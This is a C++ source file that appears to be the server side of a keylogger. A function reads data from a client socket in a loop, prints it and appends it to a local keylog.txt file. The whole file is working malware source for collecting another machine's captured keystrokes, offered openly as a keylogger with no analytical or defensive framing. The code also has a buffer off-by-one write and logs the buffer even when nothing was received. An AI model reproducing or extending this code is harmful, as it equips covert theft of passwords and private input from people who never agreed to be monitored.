#include "keylogger.h"
#include <iostream>
#include <fstream>
#include <winsock2.h>

using namespace std;

void keyloggingFile(char* buffer){
    FILE* logFile = fopen("../assets/keylog.txt", "a+");
    fprintf(logFile, "%s", buffer);
    fclose(logFile);
}

void keylogging(int clientSocket) {
    while (keyloggerRunning) {
        char buffer[1024] = {0};
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            cout << buffer << std::endl;
        }
        keyloggingFile(buffer);
    }
}